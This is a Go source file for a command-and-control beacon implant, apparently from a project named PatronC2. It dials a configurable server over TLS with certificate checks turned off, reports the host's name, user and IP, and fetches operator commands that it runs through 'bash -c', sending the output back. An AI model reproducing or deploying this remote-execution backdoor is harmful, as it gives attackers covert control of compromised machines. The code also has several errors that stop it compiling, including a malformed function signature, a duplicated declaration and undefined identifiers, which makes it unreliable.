package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
)

func main() {
	Init()
	config, err := loadCertificate()
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	agentID, hostname, username := generateAgentMetadata()

	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)

	for {
		beacon, err := establishConnection(config)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := getLocalIP(beacon)
		err = handleConfigurationRequest(beacon, agentID, hostname, username, ip)
		if err != nil {
			logger.Logf(logger.Error, "Error sending configuration request: %v", err)
			beacon.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		logger.Logf(logger.Info, "Beacon successful")

		sleepInterval := calculateSleepInterval()
		time.Sleep(time.Second * time.Duration(sleepInterval))
	}
}

func Init() {
	enableLogging := true
	logger.EnableLogging(enableLogging)
	err := logger.SetLogFile("app.log")
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
	}
	gob.Register(types.Request{})
    gob.Register(types.ConfigurationRequest{})
    gob.Register(types.ConfigurationResponse{})
}

func loadCertificate() (*tls.Config, error) {
	publickey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}

	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publickey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

func generateAgentMetadata() (string, string, string) {
	agentID := uuid.New().String()
	hostname, err := exec.Command("hostname", "-f").Output()
	if err != nil {
		hostname = []byte("unknown-host")
	}
	username, err := exec.Command("whoami").Output()
	if err != nil {
		username = []byte("unknown-user")
	}
	return agentID, strings.TrimSpace(string(hostname)), strings.TrimSpace(string(username))
}

func establishConnection(config *tls.Config) (*tls.Conn, error) {
	beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
	if err != nil {
		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
	}
	return beacon, err
}

func getLocalIP(beacon *tls.Conn) string {
	ipAddress := beacon.LocalAddr().(*net.TCPAddr)
	return fmt.Sprintf("%v", ipAddress)
}

func handleConfigurationRequest(beacon *tls.Conn, agentID, hostname, username, ip string) error {
    configReq := types.ConfigurationRequest{
        AgentID:           agentID,
        Username:          username,
        Hostname:          hostname,
        AgentIP:           ip,
        ServerIP:          ServerIP,
        ServerPort:        ServerPort,
        CallbackFrequency: CallbackFrequency,
        CallbackJitter:    CallbackJitter,
        MasterKey:         "MASTERKEY",
    }

    request := types.Request{
        Type:    types.ConfigurationRequestType,
        Payload: configReq,
    }

    encoder := gob.NewEncoder(beacon)
    if err := encoder.Encode(request); err != nil {
        return err
    }

    var response types.Response
    decoder := gob.NewDecoder(beacon)
    if err := decoder.Decode(&response); err != nil {
        return err
    }

    if response.Type == types.ConfigurationResponseType {
        configResponse, ok := response.Payload.(types.ConfigurationResponse)
        if !ok {
            return fmt.Errorf("unexpected payload type")
        }

        updateClientConfig(configResponse)
    } else {
        return fmt.Errorf("unexpected response type: %v", response.Type)
    }
    return nil
}

func updateClientConfig(config types.ConfigurationResponse) {
    if config.ServerIP != ServerIP {
		logger.Logf(logger.Info, "Updating callback IP")
        ServerIP = config.ServerIP
    }
    if config.ServerPort != ServerPort {
		logger.Logf(logger.Info, "Updating callback port")
        ServerPort = config.ServerPort
    }
    if config.CallbackFrequency != CallbackFrequency {
		logger.Logf(logger.Info, "Updating callback frequency")
        CallbackFrequency = config.CallbackFrequency
    }
    if config.CallbackJitter != CallbackJitter {
		logger.Logf(logger.Info, "Updating callback jitter")
        CallbackJitter = config.CallbackJitter
    }
}

func handleCommandRequest(beacon *tls.Conn, agentID) err {
	logger.Logf(logger.Info, "Fetching commands to run")
	out:
	for {
		commandReq := types.CommandRequest{
			AgentID: agentID,
		}

		request := types.Request{
			Type:		types.CommandRequestType,
			Payload:	commandReq,
		}

		encoder := gob.NewEncoder(beacon)
		encoder := gob.NewEncoder(beacon)
		if err := encoder.Encode(request); err != nil {
			return err
		}

		var response types.Response
		decoder := gob.NewDecoder(beacon)
		if err := decoder.Decode(&response); err != nil {
			return err
		}

		if response.Type == types.CommandResponseType {
			commandResponse, ok := response.Payload.(types.CommandResponse)
			if !ok {
				return fmt.Errorf("unexpected payload type")
			}

			// Run the command
			commandResult := executeCommand(commandResponse)

			// Send the command output to server
			statusRequest := types.Request{
				Type:		types.CommandStatusRequest,
				Payload:	commandResult,
			}
			if err := encoder.Encode(statusRequest); err != nil {
				return err
			}

			// The server is going to try and some response, we don't need it though.
			if err := decoder.Decode(&response); err != nil {
				return err
			}

			// Keep running until all commands are ran
			if commandResult.CommandResult == 2 {
				break out
			}
		} else {
			return fmt.Errorf("unexpected response type: %v", response.Type)
		}
	}
    return nil
}

func executeCommand(instruct *types.CommandResponse) types.CommandStatusRequest {
    var result string
	var CmdOut string
	Logger.Logf(logger.Info, "Running command: %v", instruct.Command)
	switch instruct.CommandType {
	case "shell":
		CmdOut = runShellCommand(instruct.Command)
        result = "1"
	case "kill":
		CmdOut = "~Killed~"
        result = "1"
	default:
		CmdOut = ""
        result = "2"
	}
	return types.CommandStatusRequest{
		AgentID:		CommandResponse.AgentID,
		CommandID:		CommandResponse.CommandID,
		Result:			result,
		Output:			CmdOut,
	}
}

func runShellCommand(command string) string {
	if command == "" {
		return ""
	}
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Logf(logger.Error, "Error running command: %v", command)
		return err.Error()
	}
	logger.Logf(logger.Done, "Ran command: %v", command)
	return string(output)
}

func calculateSleepInterval() float64 {
	rand.Seed(time.Now().UnixNano())
	frequency, _	:= strconv.Atoi(CallbackFrequency)
	jitter, _		:= strconv.Atoi(CallbackJitter)
	jitterPercent	:= float64(jitter) * 0.01
	baseTime		:= float64(frequency)
	variance		:= baseTime * jitterPercent * rand.Float64()
	return baseTime - (jitterPercent * baseTime) + 2*variance
}
